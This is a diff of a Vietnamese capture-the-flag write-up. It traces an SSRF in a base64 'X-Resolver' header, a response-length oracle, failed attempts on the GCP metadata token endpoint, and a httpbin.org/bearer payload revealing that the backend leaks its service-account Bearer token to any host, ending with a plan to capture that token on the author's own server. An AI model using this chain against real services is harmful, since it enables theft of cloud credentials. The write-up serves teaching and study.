@@ -42,6 +42,8 @@ Có một header lạ `X-Resolver`. Giá trị trông như base64 nhưng dính c
 {"resolver":"https://en.wikipedia.org/wiki/Space_weather"}
 ```
 
+![](./origin_decode.jpg)
+
 Soi đoạn client JS (file `_app/immutable/.../*.js`) để xác nhận cách header được tạo, ta thấy đoạn cần lưu ý:
 
 ```javascript!
@@ -64,6 +66,12 @@ Nghĩa là backend sẽ **đi fetch cái URL nằm trong field `resolver`** mà 
 ![image](./02-reading.png)
 
 Vấn đề: server fetch URL của ta nhưng **không trả về nội dung** — nó chỉ trả về một con số "nhiệt độ" như `3604.5°C` ở trên. Vậy con số đó từ đâu ra? Ta thử trỏ `resolver` vào vài URL có độ dài body biết trước:
+
+![](./10_encode.jpg)
+![](./10_result.jpg)
+
+![](./537_encode.jpg)
+![](./537_result.jpg)
 
 | resolver | trả về |
 |---|---|
@@ -91,19 +99,31 @@ Nhưng path thật sự đáng giá không phải `project-id`. Metadata server 
 GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
 ```
 
-Gọi được endpoint này nghĩa là lấy được một `Authorization: Bearer <token>` hợp lệ để giả danh chính service account của server — tức leo thẳng từ SSRF lên quyền GCP. Vấn đề là GCP metadata server **bắt buộc** mọi request phải kèm header `Metadata-Flavor: Google`, nếu không sẽ từ chối (đây là cơ chế chống SSRF ngây thơ chuẩn của GCP — chỉ cần request thiếu header này, metadata server coi như không hợp lệ). Ta thử nhét thêm field `headers` vào JSON `X-Resolver` để tự chèn header đó vào request outbound, kiểm bằng `httpbin.org/headers` (echo lại header nhận được) — độ dài response **không đổi**, nghĩa là backend không forward field `headers` ta khai báo. CRLF-inject hay đổi qua path legacy `/v1beta1`, `/0.1` cũng không ăn. Những path không cần header như `/`, `/computeMetadata/` thì đọc được nhưng vô dụng, không chứa token.
+Gọi được endpoint này nghĩa là lấy được một `Authorization: Bearer <token>` hợp lệ để giả danh chính service account của server — tức leo thẳng từ SSRF lên quyền GCP. 
+Vấn đề là GCP metadata server **bắt buộc** mọi request phải kèm header `Metadata-Flavor: Google`, nếu không sẽ từ chối (đây là cơ chế chống SSRF ngây thơ chuẩn của GCP — chỉ cần request thiếu header này, metadata server coi như không hợp lệ). 
+Ta thử nhét thêm field `headers` vào JSON `X-Resolver` để tự chèn header đó vào request outbound, kiểm bằng `httpbin.org/headers` (echo lại header nhận được) 
+-> Độ dài response **không đổi**
+-> Nghĩa là backend không forward field `headers` ta khai báo. 
+CRLF-inject hay đổi qua path legacy `/v1beta1`, `/0.1` cũng không ăn. Những path không cần header như `/`, `/computeMetadata/` thì đọc được nhưng vô dụng, không chứa token.
 
 ### Twist: backend tự đính kèm credential của chính nó
 
-Vậy bài toán chốt lại: ta cần header `Metadata-Flavor: Google` trên request đi tới metadata server, nhưng không có cách nào tự chèn header vào request mà backend gửi đi. Ta không kiểm soát được header — nhưng **backend** thì có. Nếu server này tự nó cũng là một GCP client (dùng Cloud SDK/Google client library để gọi các API khác của Google), rất có thể nó đã cấu hình sẵn một lớp middleware tự động đính `Authorization: Bearer <access-token-của-service-account>` vào *mọi* request outbound, không phân biệt đích đến — một thói quen phổ biến khi code lười không giới hạn client theo domain. Nếu đúng vậy, ta không cần tự lấy token qua đường `/service-accounts/default/token` nữa — token sẽ tự "theo" request của ta đi tới bất kỳ đâu ta trỏ `resolver` vào.
+Vậy bài toán chốt lại: ta cần header `Metadata-Flavor: Google` trên request đi tới metadata server, nhưng không có cách nào tự chèn header vào request mà backend gửi đi. 
+
+Ta không kiểm soát được header — nhưng **backend** thì có. Nếu server này tự nó cũng là một GCP client (dùng Cloud SDK/Google client library để gọi các API khác của Google), rất có thể nó đã cấu hình sẵn một lớp middleware tự động đính [Authorization: Bearer <access-token-của-service-account>](https://docs.cloud.google.com/docs/authentication/rest#user-creds) vào *mọi* request outbound. 
+
+Nếu đúng vậy, ta không cần tự lấy token qua đường `/service-accounts/default/token` nữa — token sẽ tự "theo" request của ta đi tới bất kỳ đâu ta trỏ `resolver` vào.
 
 Để kiểm chứng giả thuyết này mà không đọc được nội dung response (chỉ có length oracle), ta cần một endpoint phản ứng khác nhau rõ rệt tùy có hay không có header `Authorization`. `https://httpbin.org/bearer` trả `401` rỗng nếu thiếu `Authorization`, trả `200` + JSON nếu có — đúng oracle cần.
 
 ```json!
 {"resolver":"https://httpbin.org/bearer"}
 ```
+![](./bearer_encode.jpg)
+![](./bearer_result.jpg)
 
-Backend nhận về **1068 byte** (nhiệt độ ~`106.8`) — tức là có body JSON dài. Vậy **backend tự nó đã đính kèm `Authorization: Bearer <token>`** vào mọi request outbound (~1030 ký tự token). Ta không cần tự gửi token — server tự "khoe" nó ra rồi!
+Backend nhận về **1068 byte** (nhiệt độ ~`106.8`) — tức là có body JSON dài. 
+Vậy **backend tự nó đã đính kèm `Authorization: Bearer <token>`** vào mọi request outbound (~1030 ký tự token). Ta không cần tự gửi token — server tự "khoe" nó ra rồi!
 
 -> Giờ chỉ cần làm server fetch tới **máy chủ của ta** để bắt lại cái token đó.
 
